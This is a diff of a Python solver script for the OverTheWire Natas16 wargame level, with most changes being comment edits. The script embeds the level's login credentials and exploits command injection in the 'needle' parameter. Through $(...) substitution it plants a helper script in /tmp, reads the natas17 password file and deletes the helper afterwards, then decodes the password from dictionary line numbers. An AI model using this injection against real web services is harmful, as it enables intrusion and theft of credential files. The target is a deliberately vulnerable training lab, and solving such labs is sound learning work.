@@ -7,9 +7,8 @@ import re
 base_url = 'http://natas16.natas.labs.overthewire.org'
 auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  
 
-#setup
+# setup - install script on /tmp
 shifter_script = "shift $1\necho $1\n\n"
-
 shifter_b64 = base64.b64encode(bytes(shifter_script,"ascii")).decode('ascii')
 
 setup_payload = [
@@ -21,7 +20,7 @@ setup_payload = [
 for payload in setup_payload:
   r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
 
-#extract natas17 password
+# extract natas17 password
 matches = []
 for pair in range(1,17): 
   payload=f'^$(sed -n $(/tmp/shifter.sh {pair} $(od -An -tu2 -w64 < /etc/natas_webpass/natas17))p < dictionary.txt)$'
@@ -31,20 +30,21 @@ for pair in range(1,17):
   word = m.group(1).strip()
   matches.append(word)
 
-#grab dictionary.txt
+# grab dictionary.txt
 r = requests.get(f'{base_url}/dictionary.txt', auth=auth)
 diclines = r.text.splitlines() 
 print(matches)
 
+# find word in dictionary -> convert dictionary line to byte pair (little endian)
 elb = []
 for m in matches:
   i = diclines.index(m)+1
   elb.append(i & 255)
   elb.append(i >> 8)
 
-#password
+# combine btyte to password string
 print("".join([chr(c) for c in elb]))
 
-#cleanup
+# cleanup
 payload = '$(rm /tmp/shifter.*)'
 r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
